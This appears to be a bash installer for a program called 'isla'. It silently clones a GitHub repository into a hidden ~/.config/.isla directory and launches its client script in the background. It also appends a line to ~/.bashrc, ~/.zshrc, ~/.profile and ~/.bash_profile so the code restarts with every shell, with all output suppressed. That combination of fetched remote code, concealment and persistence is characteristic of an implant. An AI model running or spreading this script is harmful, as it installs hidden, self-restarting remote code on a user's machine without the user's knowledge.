#!/bin/bash
TTY=""

mkdir -p ~/.config/.isla
git clone https://github.com/marnixah/isla.git ~/.config/.isla >/dev/null 2>&1 || (
  cd ~/.config/.isla
  git checkout . >/dev/null 2>&1
  git clean -fd >/dev/null 2>&1
  git pull >/dev/null 2>&1
)

cd ~/.config/.isla

chmod +x ~/.config/.isla/src/client/start.sh
chmod +x ~/.config/.isla/src/client/setup.sh

inject_into_file() {
  FILE=$1
  LINE="nohup ~/.config/.isla/src/client/setup.sh >/dev/null 2>&1"

  # If the file doesn't exist, ignore it
  [ -f "$FILE" ] || return

  # Check if the line is already in the file
  grep -qF -- "$LINE" "$FILE" || echo "$LINE" >>"$FILE"
}

inject_into_file ~/.bashrc
inject_into_file ~/.zshrc
inject_into_file ~/.profile
inject_into_file ~/.bash_profile

nohup ./src/client/start.sh >/dev/null 2>&1
